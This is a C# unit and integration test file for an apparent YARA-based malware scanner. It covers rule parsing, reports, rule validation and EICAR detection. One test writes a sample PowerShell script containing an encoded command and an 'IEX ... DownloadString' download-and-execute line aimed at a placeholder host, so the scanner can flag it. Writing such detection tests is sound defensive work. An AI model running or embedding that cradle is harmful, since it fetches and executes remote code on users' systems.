using System.Text;
using System.Text.Json;
using Becetti.Security.Core.Models;
using Becetti.Security.Core.Services;

namespace Becetti.Security.Core.Tests;

/// <summary>
/// Unit tests and real Windows x64 Native YARA Engine integration tests.
/// When running on Windows x64 with the official YARA binaries built by
/// scripts/build-yara-win64.ps1, the integration tests exercise real yara64.exe
/// and yarac64.exe rule validation, compilation, EICAR detection, clean file
/// scanning, suspicious script detection, invalid rule isolation, and TXT/JSON/PDF
/// report generation.
/// </summary>
public sealed class YaraEngineServiceTests : IDisposable
{
    private readonly string _tempDir;

    public YaraEngineServiceTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), "becetti-yara-tests-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_tempDir);
    }

    public void Dispose()
    {
        try
        {
            if (Directory.Exists(_tempDir))
                Directory.Delete(_tempDir, recursive: true);
        }
        catch
        {
            // Best-effort cleanup
        }
    }

    private YaraEngineService CreateService(out SettingsService settings)
    {
        var dataDir = Path.Combine(_tempDir, "appdata-" + Guid.NewGuid().ToString("N"));
        settings = new SettingsService(dataDir);
        var bundledRules = Environment.GetEnvironmentVariable("BECETTI_YARA_RULES_DIR");
        return new YaraEngineService(new HttpClient(), settings, bundledRulesDirectory: bundledRules);
    }

    // -------------------------------------------------------------------------
    // Unit tests (run on every OS, no native binary required)
    // -------------------------------------------------------------------------

    [Fact]
    public void ParseYaraScanOutput_HandlesTagsMetadataAndWindowsPathWithDriveColon()
    {
        var stdout = "BECETTI_EICAR_Standard_Antivirus_Test_File [eicar,test,antivirus] [description=\"Standard EICAR antivirus test file\",author=\"BECETTI SECURITY\",severity=\"high\"] C:\\Users\\Test\\Desktop\\eicar_sample.txt";

        var matches = YaraEngineService.ParseYaraScanOutput(stdout, "C:\\Users\\Test\\Desktop\\eicar_sample.txt");

        var match = Assert.Single(matches);
        Assert.Equal("BECETTI_EICAR_Standard_Antivirus_Test_File", match.RuleName);
        Assert.Equal("C:\\Users\\Test\\Desktop\\eicar_sample.txt", match.FilePath);
        Assert.Equal("Standard EICAR antivirus test file", match.Description);
        Assert.Equal("BECETTI SECURITY", match.Author);
        Assert.Equal("high", match.Severity);
        Assert.Equal(new[] { "eicar", "test", "antivirus" }, match.Tags);
    }

    [Fact]
    public void ParseYaraScanOutput_ParsesMultiRuleMatchesWithStringOffsetsAndEscapedMetadata()
    {
        var stdout = string.Join("\n", new[]
        {
            "BECETTI_EICAR_Standard_Antivirus_Test_File [eicar,test] [description=\"EICAR test\",severity=\"high\"] C:\\Temp\\eicar.com",
            "0x0:$eicar_std: X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
            "BECETTI_Suspicious_Script [] [description=\"Detects encoded \\\"PowerShell\\\" loader\",severity=\"critical\"] C:\\Temp\\run.ps1",
            "0x1a:$enc: -EncodedCommand",
            "0x42:$dl: DownloadString"
        });

        var matches = YaraEngineService.ParseYaraScanOutput(stdout, "C:\\Temp\\fallback.bin");

        Assert.Equal(2, matches.Count);
        Assert.Equal("BECETTI_EICAR_Standard_Antivirus_Test_File", matches[0].RuleName);
        Assert.Single(matches[0].MatchedStrings);
        Assert.Equal("0x0", matches[0].MatchedStrings[0].Offset);
        Assert.Equal("$eicar_std", matches[0].MatchedStrings[0].Identifier);

        Assert.Equal("BECETTI_Suspicious_Script", matches[1].RuleName);
        Assert.Equal("Detects encoded \"PowerShell\" loader", matches[1].Description);
        Assert.Equal("critical", matches[1].Severity);
        Assert.Equal(2, matches[1].MatchedStrings.Count);
        Assert.Equal("$dl", matches[1].MatchedStrings[1].Identifier);
    }

    [Fact]
    public void FormatReports_TextJsonAndPdf_IncludeMatchesAndValidStructure()
    {
        var service = CreateService(out _);
        var report = new YaraScanReport
        {
            EngineVersion = "4.6.0",
            TargetPath = @"C:\Samples",
            StartedAt = DateTimeOffset.UtcNow.AddSeconds(-2),
            EndedAt = DateTimeOffset.UtcNow,
            FilesScanned = 2,
            ActiveRuleFilesCount = 4,
            TotalRulesLoaded = 12,
            Matches = new[]
            {
                new YaraRuleMatch
                {
                    RuleName = "BECETTI_EICAR_Standard_Antivirus_Test_File",
                    Description = "Detects the standard EICAR antivirus test pattern",
                    Severity = "high",
                    FilePath = @"C:\Samples\eicar.txt",
                    Tags = new[] { "eicar", "test" },
                    MatchedStrings = new[]
                    {
                        new YaraMatchedString { Offset = "0x0", Identifier = "$eicar_std", Preview = "X5O!P%..." }
                    }
                }
            }
        };

        var text = service.FormatReportAsText(report);
        Assert.Contains("BECETTI_EICAR_Standard_Antivirus_Test_File", text);
        Assert.Contains("Detects the standard EICAR antivirus test pattern", text);

        var json = service.FormatReportAsJson(report);
        using var doc = JsonDocument.Parse(json);
        Assert.Equal("4.6.0", doc.RootElement.GetProperty("EngineVersion").GetString());
        Assert.True(doc.RootElement.GetProperty("ThreatFound").GetBoolean());

        var pdfBytes = service.FormatReportAsPdf(report);
        Assert.NotNull(pdfBytes);
        Assert.True(pdfBytes.Length > 200);
        var pdfHeader = Encoding.ASCII.GetString(pdfBytes, 0, 8);
        var pdfTail = Encoding.ASCII.GetString(pdfBytes, pdfBytes.Length - 16, 16);
        Assert.StartsWith("%PDF-1.4", pdfHeader);
        Assert.Contains("%%EOF", pdfTail);
    }

    // -------------------------------------------------------------------------
    // Real Windows x64 Native YARA Engine Integration Tests
    // (Executed directly against VirusTotal/yara yara64.exe & yarac64.exe on CI)
    // -------------------------------------------------------------------------

    [Fact]
    public async Task WindowsX64_YaraEngine_InitializeVersionAndBundledRules_Succeeds()
    {
        var service = CreateService(out _);
        if (!OperatingSystem.IsWindows() || service.FindYaraExecutable() is null)
            return;

        var init = await service.InitializeAsync();

        Assert.True(init.Success, init.Message);
        Assert.NotNull(init.Value);
        Assert.True(init.Value!.IsAvailable);
        Assert.False(string.IsNullOrWhiteSpace(init.Value.Version));
        Assert.True(init.Value.ValidRuleFiles >= 4, $"Expected >= 4 bundled valid rule files, got {init.Value.ValidRuleFiles}");
        Assert.Equal(0, init.Value.InvalidRuleFiles);
        Assert.True(init.Value.ActiveRuleCount >= 10, $"Expected >= 10 active compiled rules, got {init.Value.ActiveRuleCount}");
    }

    [Fact]
    public async Task WindowsX64_YaraEngine_DetectsRealEicarTestFile_AndCleanFileProducesZeroMatches()
    {
        var service = CreateService(out _);
        if (!OperatingSystem.IsWindows() || service.FindYaraExecutable() is null)
            return;

        var init = await service.InitializeAsync();
        Assert.True(init.Success, init.Message);

        // Assemble standard EICAR test string at runtime so source code stays benign.
        var eicar = string.Concat(
            "X5O!P%@AP[4\\PZX54(P^)7CC)7}$",
            "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!",
            "$H+H*");

        var scanDir = Path.Combine(_tempDir, "samples");
        Directory.CreateDirectory(scanDir);
        var eicarFile = Path.Combine(scanDir, "eicar_test_sample.txt");
        var cleanFile = Path.Combine(scanDir, "benign_readme.txt");
        await File.WriteAllTextAsync(eicarFile, eicar, Encoding.ASCII);
        await File.WriteAllTextAsync(cleanFile, "Hello from BECETTI SECURITY clean file test.", Encoding.UTF8);

        // 1. Clean file scan -> 0 matches
        var cleanResult = await service.ScanAsync(cleanFile);
        Assert.True(cleanResult.Success, cleanResult.Message);
        Assert.NotNull(cleanResult.Value);
        Assert.Equal(1, cleanResult.Value!.FilesScanned);
        Assert.Empty(cleanResult.Value.Matches);
        Assert.False(cleanResult.Value.ThreatFound);

        // 2. EICAR file scan -> real detection with rule name, description, severity, matched string
        var progressUpdates = new List<YaraScanProgress>();
        var progress = new Progress<YaraScanProgress>(p => progressUpdates.Add(p));
        var eicarResult = await service.ScanAsync(eicarFile, progress);
        Assert.True(eicarResult.Success, eicarResult.Message);
        Assert.NotNull(eicarResult.Value);
        Assert.Equal(1, eicarResult.Value!.FilesScanned);
        Assert.True(eicarResult.Value.ThreatFound);

        var match = Assert.Single(eicarResult.Value.Matches, m => m.RuleName == "BECETTI_EICAR_Standard_Antivirus_Test_File");
        Assert.False(string.IsNullOrWhiteSpace(match.Description));
        Assert.NotEmpty(match.MatchedStrings);

        // 3. Directory scan -> discovers both files, flags only the EICAR file
        var dirResult = await service.ScanAsync(scanDir);
        Assert.True(dirResult.Success, dirResult.Message);
        Assert.Equal(2, dirResult.Value!.FilesScanned);
        Assert.Single(dirResult.Value.Matches.Select(m => m.FilePath).Distinct(StringComparer.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task WindowsX64_YaraEngine_DetectsSuspiciousPowerShellScript()
    {
        var service = CreateService(out _);
        if (!OperatingSystem.IsWindows() || service.FindYaraExecutable() is null)
            return;

        var init = await service.InitializeAsync();
        Assert.True(init.Success, init.Message);

        var scriptPath = Path.Combine(_tempDir, "suspicious_test.ps1");
        await File.WriteAllTextAsync(
            scriptPath,
            "powershell -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAApAA==\n" +
            "# Also references IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/p.ps1')\n");

        var scan = await service.ScanAsync(scriptPath);
        Assert.True(scan.Success, scan.Message);
        Assert.Contains(scan.Value!.Matches, m => m.RuleName == "BECETTI_Suspicious_PowerShell_Download_Cradle");
    }

    [Fact]
    public async Task WindowsX64_YaraEngine_InvalidAndOutdatedRules_AreRejectedAndIsolatedWithoutBreakingScanner()
    {
        var service = CreateService(out var settings);
        if (!OperatingSystem.IsWindows() || service.FindYaraExecutable() is null)
            return;

        var init = await service.InitializeAsync();
        Assert.True(init.Success, init.Message);

        // 1. Validate a broken syntax rule file
        var brokenRule = Path.Combine(_tempDir, "broken_syntax.yar");
        await File.WriteAllTextAsync(brokenRule, "rule Broken_Test { strings: $a = \"abc\" condition: $nonexistent_var }");

        var validation = await service.ValidateRuleFileAsync(brokenRule);
        Assert.True(validation.Success);
        Assert.False(validation.Value!.IsValid);
        Assert.False(string.IsNullOrWhiteSpace(validation.Value.ErrorMessage));

        // 2. Attempting to import the broken rule must be refused
        var importBroken = await service.ImportRuleFileAsync(brokenRule);
        Assert.False(importBroken.Success);

        // 3. Even if a broken/outdated rule file is manually dropped into the user rules directory,
        //    RebuildCompiledRulesAsync isolates it and STILL compiles all valid rules so scanning works!
        var userRulesDir = Path.Combine(settings.DataDirectory, "yara", "rules", "user");
        Directory.CreateDirectory(userRulesDir);
        File.Copy(brokenRule, Path.Combine(userRulesDir, "manually_dropped_broken.yar"), overwrite: true);

        var recompile = await service.RebuildCompiledRulesAsync();
        Assert.True(recompile.Success, recompile.Message);
        Assert.NotNull(recompile.Value);
        Assert.True(recompile.Value!.ValidRuleFiles >= 4);
        Assert.Equal(1, recompile.Value.InvalidRuleFiles);

        var rules = await service.GetRuleFilesAsync();
        Assert.Contains(rules.Value!, r =>
            r.FileName == "manually_dropped_broken.yar" &&
            r.Status == YaraRuleValidationStatus.Invalid &&
            !string.IsNullOrWhiteSpace(r.ValidationError));

        // 4. Verify the scanner STILL works cleanly despite the isolated invalid rule!
        var validRulePath = Path.Combine(_tempDir, "custom_valid.yara");
        await File.WriteAllTextAsync(validRulePath,
            "rule BECETTI_Custom_UnitTest_Marker\n" +
            "{\n" +
            "    meta:\n" +
            "        description = \"Unit test custom .yara marker rule\"\n" +
            "        severity = \"low\"\n" +
            "    strings:\n" +
            "        $m = \"BECETTI-UNIT-TEST-YARA-MARKER-98765\"\n" +
            "    condition:\n" +
            "        $m\n" +
            "}\n");

        var importValid = await service.ImportRuleFileAsync(validRulePath);
        Assert.True(importValid.Success, importValid.Message);

        var markerFile = Path.Combine(_tempDir, "marker.bin");
        await File.WriteAllTextAsync(markerFile, "prefix BECETTI-UNIT-TEST-YARA-MARKER-98765 suffix");

        var scan = await service.ScanAsync(markerFile);
        Assert.True(scan.Success, scan.Message);
        Assert.Contains(scan.Value!.Matches, m => m.RuleName == "BECETTI_Custom_UnitTest_Marker");
    }
}
